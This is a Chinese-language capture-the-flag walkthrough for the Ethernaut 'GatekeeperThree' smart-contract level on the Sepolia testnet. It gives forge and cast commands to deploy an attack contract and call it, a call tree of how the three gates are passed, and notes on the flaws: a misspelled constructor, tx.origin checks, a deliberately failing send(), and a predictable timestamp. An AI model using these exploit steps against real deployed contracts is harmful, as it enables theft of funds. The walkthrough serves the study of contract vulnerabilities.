# 29-GatekeeperThree
```
# 1. 部署攻击合约
export GatekeeperThree_ADDRESS=0xb8c4a855d76719513Ec65558D229c4A8375012Cc
forge create src/29-GatekeeperThree/GatekeeperThreeAttack.sol:GatekeeperThreeAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $GatekeeperThree_ADDRESS
Deployed to: 0x4A846e9a2852DDa7dC78bEC97ff92a9a35e676f1

export ATTACK_ADDRESS=0x4A846e9a2852DDa7dC78bEC97ff92a9a35e676f1

# 2. 执行攻击（需要发送 ETH）
cast send $ATTACK_ADDRESS "attack()" \
    --value 0.002ether \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 3. 验证成功
cast call $GatekeeperThree_ADDRESS "entrant()(address)" --rpc-url $sepolia_rpc
# 应该返回你的地址

# 攻击流程
attack()
  ├─ target.construct0r()           ← Gate 1: 攻击合约成为 owner
  ├─ target.createTrick()           ← 创建 SimpleTrick
  ├─ target.getAllowance(timestamp) ← Gate 2: 设置 allowEntrance = true
  ├─ transfer(0.002 ether)          ← 向目标发送 ETH
  └─ target.enter()                 ← Gate 3: send() 失败（无 receive），通过！
       └─ entrant = tx.origin ✓
```

### 考察点
- **构造函数拼写错误**：`construct0r`（数字0）不是真正的 constructor，任何人可调用
- **tx.origin vs msg.sender**：通过合约调用绕过 owner 检查
- **send() 失败利用**：攻击合约不实现 receive/fallback，故意让 send 失败
- **时间戳作为密码**：`block.timestamp` 可预测，不安全